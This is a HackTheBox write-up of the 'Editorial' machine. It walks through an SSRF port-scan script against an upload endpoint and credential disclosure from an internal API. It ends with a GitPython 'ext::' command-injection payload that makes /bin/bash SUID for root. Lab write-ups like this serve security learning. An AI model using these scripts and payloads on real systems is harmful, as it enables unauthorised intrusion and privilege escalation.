---
title: Editorial Hackthebox
date: 13-7-2024
categories: [hackthebox,writeup] 
tags: [Gitpython,scripting,SSRF]
---

# Editorial

![Editorial](/assets/img/editorial/editorial.jpeg)

Editorial is a Season 5 machine from Week 9 on HackTheBox. It is considered an easy box, but the enumeration phase requires careful attention. The host has two open ports, one of which is an HTTP port. We discovered a file upload function with a book URL input that connects to our Python web server. This function allows us to identify an internal port. After gaining initial access, we found a .git repository containing user credentials. A Python script can be executed with sudo permissions by that user, leading to root access via an exploit found in the Python script's library.


## **Recon**

We start with an NMAP scan.

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the web application, we find a file upload function. The highlighted part in the image below is the injection point where we can access the internal port.

![alt text](/assets/img/editorial/image-1.png)

The URL input connects to our Python web server once supplied, as shown in the screenshot below of my local IP.

![alt text](/assets/img/editorial/image-2.png)

I tried various file types to upload to the server. However, the application does not allow access to the uploaded files. Using Burp Suite, we can see that an image is returned from the localhost URL, allowing us to enumerate the internal ports.

![alt text](/assets/img/editorial/image-4.png)

Craft a script to make it easier to enumerate each port and the response.

```python
import requests

def file_upload(ports):
    url = "http://editorial.htb/upload-cover"
    headers = {
        "Host": "editorial.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "multipart/form-data; boundary=---------------------------2558739193374546790339287871",
        "Origin": "http://editorial.htb",
        "Connection": "close",
        "Referer": "http://editorial.htb/upload"
    }
    data = (
        "-----------------------------2558739193374546790339287871\r\n"
        'Content-Disposition: form-data; name="bookurl"\r\n\r\n'
        f"http://127.0.0.1:{ports}/\r\n"
        "-----------------------------2558739193374546790339287871\r\n"
        'Content-Disposition: form-data; name="bookfile"; filename="test.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        "test content\r\n"
        "-----------------------------2558739193374546790339287871--\r\n"
    )

    x = requests.post(url,headers=headers,data=data)
    return x.status_code, x.text

port = range(4000,5500)
for ports in port:
    status_code, text = file_upload(ports)
    if text not in "/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg":
        print(f"[+] Port {ports} : Status code = {status_code} & Response = {text}")
    else:
        print(f"[+] Port {ports}: Same response")

```

The result show that the response of the port 5000 is different from the other port. It gave us a new endpoint we can look at it.

![alt text](/assets/img/editorial/image-7.png)

We explore the new endpoint using Burp Suite.

![alt text](/assets/img/editorial/image-8.png)

The content of "/api/latest/metadata/messages/authors" endpoint reveals credentials.

![alt text](/assets/img/editorial/image-9.png)

Using the credentials, we SSH into the server.

![alt text](/assets/img/editorial/image-10.png)

## dev Shell

In the dev home directory, we find a .git repo in the /apps directory. We view the git log for the repo.

![alt text](/assets/img/editorial/image-11.png)

Using the "git show" command, we see the content of the git log.

![alt text](/assets/img/editorial/image-12.png)

## prod shell

Running sudo -l shows that our current user can run a Python script as root.

![alt text](/assets/img/editorial/image-15.png)

The result shows that a python script can be run as root. We can review the python script and look for any information that we can use.

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

We discover an RCE vulnerability in the git library [gitPython](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858). Checking the git version with **pip list** reveals the installed library.

![alt text](/assets/img/editorial/image-16.png)

Exploiting this vulnerability, we craft a malicious command to grant /bin/bash file SUID permission.

![alt text](/assets/img/editorial/image-14.png)

The command used:

```bash

sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% +s% /bin/bash'
```


Thank you for reading.
